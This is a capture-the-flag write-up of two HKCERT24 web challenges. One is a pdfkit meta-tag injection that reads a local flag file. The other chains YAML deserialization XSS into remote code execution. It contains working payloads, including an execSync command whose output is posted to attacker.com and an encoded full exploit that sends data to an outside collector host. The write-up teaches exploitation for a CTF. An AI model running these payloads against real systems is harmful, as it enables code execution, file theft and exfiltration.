# HKCERT24

## Webpage to PDF (2)
#lfr #pdf
### Overview
Simple page that takes and url and converts the page to pdf using `pdfkit==1.0`
### Code review
The app takes the filename from the cookies:
```python
session_id = request.cookies.get('session_id')
pdf_file = f"{session_id}.pdf"
```
Then makes a request to the given url and passes the reponse as string to the pdf converter:
```python
pdfkit.from_string(response.text, pdf_file)
```

Pdfkit uses `wkhtmltopdf`, let's have a look on how it builds the cli command:
```python
def _command(self, path=None):
	yield self.wkhtmltopdf

	if not self.verbose:
			self.options.update({'--quiet': ''})

	for argpart in self._genargs(self.options):
			if argpart:
					yield argpart
				
	# If the source is a string then we will pipe it into wkhtmltopdf
	# If the source is file-like then we will read from it and pipe it in
	if self.source.isString() or self.source.isFileObj():
			yield '-'
	else:
			if isinstance(self.source.source, str):
					yield self.source.to_s()
			else:
					for s in self.source.source:
							yield s

	# If output_path evaluates to False append '-' to end of args
	# and wkhtmltopdf will pass generated PDF to stdout
	if path:
			yield path
	else:
			yield '-'

def command(self, path=None):
	return list(self._command(path))
```
this function returns a value like:
`['/usr/bin/wkhtmltopdf', '--quiet', '-', 'path']`

A command injection could happen because of `_genargs`, how options are taken:
```python
self.options.update(self._find_options_in_meta(url_or_file))

def _find_options_in_meta(self, content):
	"""Reads 'content' and extracts options encoded in HTML meta tags

	:param content: str or file-like object - contains HTML to parse

	returns:
		dict: {config option: value}
	"""
	if (isinstance(content, io.IOBase)
					or content.__class__.__name__ == 'StreamReaderWriter'):
			content = content.read()

	found = {}

	for x in re.findall('<meta [^>]*>', content):
			if re.search('name=["\']%s' % self.configuration.meta_tag_prefix, x):
					name = re.findall('name=["\']%s([^"\']*)' %
														self.configuration.meta_tag_prefix, x)[0]
					found[name] = re.findall('content=["\']([^"\']*)', x)[0]

	return found
```
This function searches for meta tags starting with `pdfkit-`, and adds the option name to the cmd args.

Payload:
```
<meta name="pdfkit-enable-local-file-access" content="">
<svg onload="x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///flag.txt');x.send();"></svg>
```

`hkcert24{c1oud-is-rand0m-st4ngers-c0mputer-and-libr4ries-are-r4ndom-stang3rs-c0de}`

## JSPyaml
#yaml #xss 
### Overview
Simple yaml parser. The page app has a report functionality with an headless bot.
### Code review
The yml is loaded using an usafe method -> RCE:
https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/
```js
app.post('/debug', (req, res) => {
    if(ip.isLoopback(req.ip) && req.cookies.debug === 'on'){
        const yaml = require('js-yaml');
        let schema = yaml.DEFAULT_SCHEMA.extend(require('js-yaml-js-types').all);
        try{
        	let input = req.body.yaml;
        	console.log(`Input: ${input}`);
        	let output = yaml.load(input, {schema});
        	console.log(`Output: ${output}`);
        	res.json(output);
        }catch(e){
        	res.status(400).send('Error');
        }
    }else{
        res.status(401).send('Unauthorized');
    }
});
```
Problem: the debug endpoint can be accessed only having the `debug` cookie.

The frontend uses a `pyodide` with a python yaml deserializer, that uses the dangerous `load` function:
``yaml.load("""$y""", yaml.Loader)``
From the documentation it's possible to see that pyodide can access the JS context -> XSS
### Exploit
1. Backend Yaml deserialization to RCE:
```
"toString": !!js/function "function (){let x = global.process.mainModule.require('child_process').execSync('cat proof.sh').toString(); console.log(x); fetch('http://attacker.com', {method: 'POST', body: x});}"
```
2. Frontend Yaml deserialization to XSS;
```
!!python/object/apply:js.document.write ['<script>document.cookies = `debug=on`</script>']
```
### Full exploit
trigger frontend deserialization with window references and hashchange xss -> set cookie+spoof ip -> rce
```
<script>
	window.open("http://127.0.0.1:3000", "sas");
	let i = 0;
	setInterval(() => {window.open("http://127.0.0.1:3000/#!!python/object/apply:js.document.write ['\x3cscript>console.log("+i+"); document.cookie=`debug=on`; const data = `%79%61%6d%6c%3d%25%32%32%74%6f%53%74%72%69%6e%67%25%32%32%25%33%61%25%32%30%21%21%6a%73%25%32%66%66%75%6e%63%74%69%6f%6e%25%32%30%25%32%32%66%75%6e%63%74%69%6f%6e%25%32%30%28%29%25%37%62%6c%65%74%25%32%30%78%25%32%30%25%33%64%25%32%30%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%28%25%32%37%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%25%32%37%29%2e%65%78%65%63%53%79%6e%63%28%25%32%37%63%61%74%25%32%30%25%32%66%70%72%6f%6f%66%2e%73%68%25%32%37%29%2e%74%6f%53%74%72%69%6e%67%28%29%25%33%62%25%32%30%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%78%29%25%33%62%25%32%30%66%65%74%63%68%28%25%32%37%68%74%74%70%25%33%61%25%32%66%25%32%66%6b%71%63%68%63%35%6c%31%2e%72%65%71%75%65%73%74%72%65%70%6f%2e%63%6f%6d%25%32%37%25%32%63%25%32%30%25%37%62%6d%65%74%68%6f%64%25%33%61%25%32%30%25%32%37%50%4f%53%54%25%32%37%25%32%63%25%32%30%62%6f%64%79%25%33%61%25%32%30%78%25%37%64%29%25%33%62%25%37%64%25%32%32`; let xhr = new XMLHttpRequest(); xhr.withCredentials = true; xhr.open(`POST`, `http://127.0.0.1:3000/debug`); xhr.setRequestHeader(`Content-Type`, `application/x-www-form-urlencoded`); xhr.setRequestHeader(`X-Forwarded-For`, `127.0.0.1`); xhr.withCredentials = true; xhr.onload = function() { console.log(xhr.response); }; xhr.send(data);\x3c/script>']", "sas");i++;}, 200);
</script>
```